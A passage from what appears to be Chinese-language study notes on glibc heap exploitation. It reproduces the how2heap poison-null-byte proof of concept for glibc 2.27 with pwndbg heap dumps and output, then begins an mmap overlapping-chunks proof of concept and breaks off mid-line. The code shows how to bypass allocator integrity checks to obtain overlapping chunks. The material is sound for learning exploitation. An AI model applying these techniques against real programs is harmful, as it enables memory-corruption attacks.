c;</span><br><span class="line">	<span class="type">uint8_t</span>* b1;</span><br><span class="line">	<span class="type">uint8_t</span>* b2;</span><br><span class="line">	<span class="type">uint8_t</span>* d;</span><br><span class="line">	<span class="type">void</span> *barrier;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We allocate 0x500 bytes for 'a'.\n"</span>);</span><br><span class="line">	a = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"a: %p\n"</span>, a);</span><br><span class="line">	<span class="type">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Since we want to overflow 'a', we need to know the 'real' size of 'a' "</span></span><br><span class="line">		<span class="string">"(it may be more than 0x500 because of rounding): %#x\n"</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">	 * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">	 * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xa00</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b: %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">	c = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"c: %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"</span></span><br><span class="line">		<span class="string">"The barrier is not strictly necessary, but makes things less confusing\n"</span>, barrier);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line">	<span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line">	<span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line">	<span class="comment">//*(size_t*)(b+0x9f0) = 0xa00;</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"In newer versions of glibc we will need to have our updated size inside b itself to pass "</span></span><br><span class="line">		<span class="string">"the check 'chunksize(P) != prev_size (next_chunk(P))'\n"</span>);</span><br><span class="line">	<span class="comment">// we set this location to 0xa00 since 0xa00 == (0xa11 &amp; 0xff00)</span></span><br><span class="line">	<span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">	*(<span class="type">size_t</span>*)(b+<span class="number">0x9f0</span>) = <span class="number">0xa00</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b.size is: (0xa00 + 0x10) | prev_in_use\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We overflow 'a' with a single null byte into the metadata of 'b'\n"</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE "EXPLOITED BUG"</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* c_prev_size_ptr = ((<span class="type">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"c.prev_size is %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line">	<span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line">	<span class="comment">// will detect the heap corruption now.</span></span><br><span class="line">	<span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line">	<span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0xa00 (was 0xa10 before the overflow)</span></span><br><span class="line">	<span class="comment">// next_chunk(P) == b-0x10+0xa00 == b+0x9f0</span></span><br><span class="line">	<span class="comment">// prev_size (next_chunk(P)) == *(b+0x9f0) == 0xa00</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n"</span>,</span><br><span class="line">		*((<span class="type">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="type">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="type">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">	b1 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b1: %p\n"</span>,b1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we malloc 'b1'. It will be placed where 'b' was. "</span></span><br><span class="line">		<span class="string">"At this point c.prev_size should have been updated, but it was not: %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Interestingly, the updated value of c.prev_size has been written 0x10 bytes "</span></span><br><span class="line">		<span class="string">"before c.prev_size: %lx\n"</span>,*(((<span class="type">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We malloc 'b2', our 'victim' chunk.\n"</span>);</span><br><span class="line">	<span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">	b2 = <span class="built_in">malloc</span>(<span class="number">0x480</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b2: %p\n"</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(b2,<span class="string">'B'</span>,<span class="number">0x480</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Current b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(b1);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Finally, we allocate 'd', overlapping 'b2'.\n"</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0xc00</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"d: %p\n"</span>,d);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now 'd' and 'b2' overlap.\n"</span>);</span><br><span class="line">	<span class="built_in">memset</span>(d,<span class="string">'D'</span>,<span class="number">0xc00</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"New b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"</span></span><br><span class="line">		<span class="string">"for the clear explanation of this technique.\n"</span>);</span><br><span class="line"></span><br><span class="line">	assert(<span class="built_in">strstr</span>(b2, <span class="string">"DDDDDDDDDDDD"</span>));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>2.27下的攻击手法和2.23几乎一样的。首先malloc 0x500 0xa00 0x500 0x100这四个chunk(a, b, c, barrier)，barrier是为了防止合并。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b250</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b760</span></span><br><span class="line">Size: <span class="number">0xa11</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555c170</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555c680</span></span><br><span class="line">Size: <span class="number">0x111</span></span><br></pre></td></tr></tbody></table></figure>

<p>我们需要构造一下使得后续的off-by-null可以正确释放。构造完成之后释放它。为什么要构造，肯定是需要过检测，会检查 chunk size 与 next chunk 的 prev_size 是否相等。假设现在有一个off-by-null的漏洞可以改b的0xa11为0xa00。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b250</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line">Free <span class="title function_">chunk</span> <span class="params">(unsortedbin)</span></span><br><span class="line">Addr: 0x55555555b760</span><br><span class="line">Size: 0xa00</span><br><span class="line">fd: 0x7ffff7dcfca0</span><br><span class="line">bk: 0x7ffff7dcfca0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55555555c160</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></tbody></table></figure>

<p>现在将b进行分割，首先malloc一个0x500的b1再malloc一个0x480的b2。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b250</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b760</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555bc70</span></span><br><span class="line">Size: <span class="number">0x491</span></span><br><span class="line"></span><br><span class="line">Free <span class="title function_">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span><br><span class="line">Addr: 0x55555555c100</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x7ffff7dcfca0</span><br><span class="line">bk: 0x7ffff7dcfca0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55555555c160</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></tbody></table></figure>

<p>接下来释放b1和c，因为unsortedbin的合并原理会将b1 b2和b剩余的再加上c一起合并。为什么？因为c的prev_size为0xa10。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b250</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line">Free <span class="title function_">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span><br><span class="line">Addr: 0x55555555b760</span><br><span class="line">Size: 0xf21</span><br><span class="line">fd: 0x55555555c100</span><br><span class="line">bk: 0x7ffff7dcfca0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55555555c680</span><br><span class="line">Size: 0x110</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555c790</span><br><span class="line">Size: 0x1f871</span><br></pre></td></tr></tbody></table></figure>

<p>这个时候b2还是正常的chunk，但是被放入了bin中。申请0xc00大小的chunk d，此时的d与b2形成了overlapping，我们可以通过d改b2。</p>
<p>运行结果</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Welcome to poison null byte <span class="number">2.0</span>!</span><br><span class="line">Tested in Ubuntu <span class="number">18.04</span> <span class="number">64b</span>it.</span><br><span class="line">This technique can be used when you have an off-by-one into a <span class="built_in">malloc</span><span class="number">'</span>ed region with a null byte.</span><br><span class="line">We allocate <span class="number">0x500</span> bytes <span class="keyword">for</span> <span class="string">'a'</span>.</span><br><span class="line">a: <span class="number">0x55555555b260</span></span><br><span class="line">Since we want to overflow <span class="string">'a'</span>, we need to know the <span class="string">'real'</span> size of <span class="string">'a'</span> (it may be more than <span class="number">0x500</span> because of rounding): <span class="number">0x508</span></span><br><span class="line">b: <span class="number">0x55555555b770</span></span><br><span class="line">c: <span class="number">0x55555555c180</span></span><br><span class="line">We allocate a barrier at <span class="number">0x55555555c690</span>, so that c is not consolidated with the top-chunk when freed.</span><br><span class="line">The barrier is not strictly necessary, but makes things less confusing</span><br><span class="line">In newer versions of glibc we will need to have our updated size inside b itself to pass the check <span class="string">'chunksize(P) != prev_size (next_chunk(P))'</span></span><br><span class="line">b.size: <span class="number">0xa11</span></span><br><span class="line">b.size is: (<span class="number">0xa00</span> + <span class="number">0x10</span>) | prev_in_use</span><br><span class="line">We overflow <span class="string">'a'</span> with a single null byte into the metadata of <span class="string">'b'</span></span><br><span class="line">b.size: <span class="number">0xa00</span></span><br><span class="line">c.prev_size is <span class="number">0xa10</span></span><br><span class="line">We will pass the check since <span class="title function_">chunksize</span><span class="params">(P)</span> == <span class="number">0xa00</span> == <span class="number">0xa00</span> == prev_size (next_chunk(P))</span><br><span class="line">b1: <span class="number">0x55555555b770</span></span><br><span class="line">Now we <span class="built_in">malloc</span> <span class="string">'b1'</span>. It will be placed where <span class="string">'b'</span> was. At this point c.prev_size should have been updated, but it was not: <span class="number">0xa10</span></span><br><span class="line">Interestingly, the updated value of c.prev_size has been written <span class="number">0x10</span> bytes before c.prev_size: <span class="number">4f</span>0</span><br><span class="line">We <span class="built_in">malloc</span> <span class="string">'b2'</span>, our <span class="string">'victim'</span> chunk.</span><br><span class="line">b2: <span class="number">0x55555555bc80</span></span><br><span class="line">Current b2 content:</span><br><span class="line">BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</span><br><span class="line">Now we <span class="built_in">free</span> <span class="string">'b1'</span> and <span class="string">'c'</span>: this will consolidate the chunks <span class="string">'b1'</span> and <span class="string">'c'</span> (forgetting about <span class="string">'b2'</span>).</span><br><span class="line">Finally, we allocate <span class="string">'d'</span>, overlapping <span class="string">'b2'</span>.</span><br><span class="line">d: <span class="number">0x55555555b770</span></span><br><span class="line">Now <span class="string">'d'</span> and <span class="string">'b2'</span> overlap.</span><br><span class="line">New b2 content:</span><br><span class="line">DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD</span><br><span class="line">Thanks to https:<span class="comment">//www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explanation of this technique.</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="mmap-overlapping-chunks-mmap"><a href="#mmap-overlapping-chunks-mmap" class="headerlink" title="mmap_overlapping_chunks(mmap)"></a>mmap_overlapping_chunks(mmap)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Technique should work on all versions of GLibC</span></span><br><span class="line"><span class="comment">Compile: `gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`</span></span><br><span class="line"><span class="comment">POC written by POC written by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>); </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Extremely large chunks are special because they are allocated in their own mmaped section\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"of memory, instead of being put onto the normal heap.\n"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"=======================================================\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating three extremely large heap chunks of size 0x100000 \n\n"</span>);</span><br><span class="line">		</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The first mmap chunk goes directly above LibC: %p\n"</span>,top_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// After this, all chunks are allocated downwards in memory towards the heap.</span></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The second mmap chunk goes below LibC: %p\n"</span>, mmap_chunk_2);</span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The third mmap chunk goes below the second mmap chunk: %p\n"</span>, mmap_chunk_3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nCurrent System Memory Layout \n"</span> \</span><br><span class="line"><span class="string">"================================================\n"</span> \</span><br><span class="line"><span class="string">"running program\n"</span> \</span><br><span class="line"><span class="string">"heap\n"</span> \</span><br><span class="line"><span class="string">"....\n"</span> \</span><br><span class="line"><span class="string">"third mmap chunk\n"</span> \</span><br><span class="line"><span class="string">"second mmap chunk\n"</span> \</span><br><span class="line"><span class="string">"LibC\n"</span> \</span><br><span class="line"><span class="string">"....\n"</span> \</span><br><span class="line"><span class="string">"ld\n"</span> \</span><br><span class="line"><span class="string">"first mmap chunk\n"</span></span><br><span class="line"><span class="string">"===============================================\n\n"</span> \</span><br><span class="line">);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Prev Size of third mmap chunk: 0x%llx\n"</span>, 